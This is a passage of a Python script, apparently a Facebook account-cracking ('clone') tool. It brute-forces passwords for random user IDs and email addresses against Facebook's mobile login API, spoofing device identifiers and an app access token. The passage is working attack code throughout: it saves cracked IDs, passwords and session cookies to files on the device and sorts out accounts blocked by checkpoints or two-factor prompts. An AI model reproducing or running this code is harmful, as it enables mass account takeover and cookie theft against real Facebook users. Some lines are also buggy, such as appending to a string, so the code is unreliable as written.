                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{R} |{G}PARVEJ-OK{R}|{G} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/pro-file-clone-m2-OK.txt','a').write(ids+' | '+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r{R} |{B}PARVEJ-2F{R}|{B} '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} |{X}PARVEJ-CP{R}|{X} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/pro-file-clone-m2-CP.txt','a').write(ids+' | '+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#-------------random-uid-method-------------#
def rndm(ids,passlist):
	global loop
	global oks
	sys.stdout.write(f'\r\r{R} |{G}FINDING{R}|{G} %s{R}|\033[1;32mSUCCES:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	try:
		for pas in passlist:
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = device['android_version']
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			fbfw = '1'
			fbrv = '0'
			fban = 'FB4A'
			fbpn = 'com.facebook.katana'
			ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+"[FBAN/FB4A;FBAV/133.0.0.37.235;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/182683139;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBDV/Galaxy Tab S8+;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
			random_seed = random.Random()
			adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
			device_id = str(uuid.uuid4())
			secure = str(uuid.uuid4())
			family = str(uuid.uuid4())
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			xd =str(''.join(random_seed.choices(string.digits, k=20)))
			sim_serials = f'["{xd}"]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			jazoest = li2+j1
			data = {
			'adid':adid,
			'format':'json',
			'device_id':device_id,
			'email':ids,
			'password':pas,
			'generate_analytics_claims':'1',
			'credentials_type':'password',
			'source':'login',
			'error_detail_type':'button_with_disabled',
			'enroll_misauth':'false',
			'generate_session_cookies':'1',
			'generate_machine_id':'1',
			'fb_api_req_friendly_name':'authenticate',
			}
			headers={
			'Authorization':f'OAuth {accessToken}',
			'X-FB-Friendly-Name':'authenticate',
			'X-FB-Connection-Type':'unknown',
			'User-Agent':samsung(),
			'Accept-Encoding':'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'X-FB-HTTP-Engine': 'Liger'
			}
			url = 'https://b-graph.facebook.com/auth/login'
			twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			po = requests.post(url,data=data,headers=headers).json()
			if 'session_key' in po:
				uid=str(po['uid'])
				RRumi = f'https://graph.facebook.com/{str(uid)}/picture?type=normal'
				res = requests.get(RRumi).text
				if "Photoshop" in res:
					print(f'\r\r{R} |{G}PARVEJ-💚{R}|{G} '+str(uid)+' | '+pas+'\033[1;32m')
					coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					#print(f'{B}<==>|{G}💚{B}|<==>: {G}'+coki)
					#linex()
					open('/sdcard/pro-random-clone-OK.txt','a').write(str(uid)+' | '+pas+' | '+coki+'\n')
					oks.append(str(uid))
					break
			else:continue
		loop+=1
	except Exception as e:
		pass
#------------random-gmail-method-------------#
def rndmgml(ids,passlist):
	global loop
	global oks
	sys.stdout.write(f'\r\r{R} |{G}FINDING{R}|{G} %s{R}|\033[1;32mSUCCES:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	try:
		for pas in passlist:
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = device['android_version']
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			fbfw = '1'
			fbrv = '0'
			fban = 'FB4A'
			fbpn = 'com.facebook.katana'
			ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+"[FBAN/FB4A;FBAV/133.0.0.37.235;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/182683139;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBDV/Galaxy Tab S8+;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
			random_seed = random.Random()
			adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
			device_id = str(uuid.uuid4())
			secure = str(uuid.uuid4())
			family = str(uuid.uuid4())
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			xd =str(''.join(random_seed.choices(string.digits, k=20)))
			sim_serials = f'["{xd}"]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			jazoest = li2+j1
			data = {
			'adid':adid,
			'format':'json',
			'device_id':device_id,
			'email':ids,
			'password':pas,
			'generate_analytics_claims':'1',
			'credentials_type':'password',
			'source':'login',
			'error_detail_type':'button_with_disabled',
			'enroll_misauth':'false',
			'generate_session_cookies':'1',
			'generate_machine_id':'1',
			'fb_api_req_friendly_name':'authenticate',
			}
			headers={
			'Authorization':f'OAuth {accessToken}',
			'X-FB-Friendly-Name':'authenticate',
			'X-FB-Connection-Type':'unknown',
			'User-Agent':sm(),
			'Accept-Encoding':'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'X-FB-HTTP-Engine': 'Liger'
			}
			url = 'https://b-graph.facebook.com/auth/login'
			twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			po = requests.post(url,data=data,headers=headers).json()
			if 'session_key' in po:
				uid=str(po['uid'])
				RRumi = f'https://graph.facebook.com/{str(uid)}/picture?type=normal'
				res = requests.get(RRumi).text
				if "Photoshop" in res:
					print(f'\r\r{R} |{G}PARVEJ-💚{R}|{G} '+str(uid)+' | '+pas+'\033[1;32m')
					coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					print(f'{B}<==>|{G}💚{B}|<==>: {G}'+coki)
					linex()
					open('/sdcard/pro-random-gmail-clone-OK.txt','a').write(str(uid)+' | '+pas+' | '+coki+'\n')
					oks.append(str(uid))
					break
			else:continue
		loop+=1
	except Exception as e:
		pass 
#------------------end--------------#
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass'))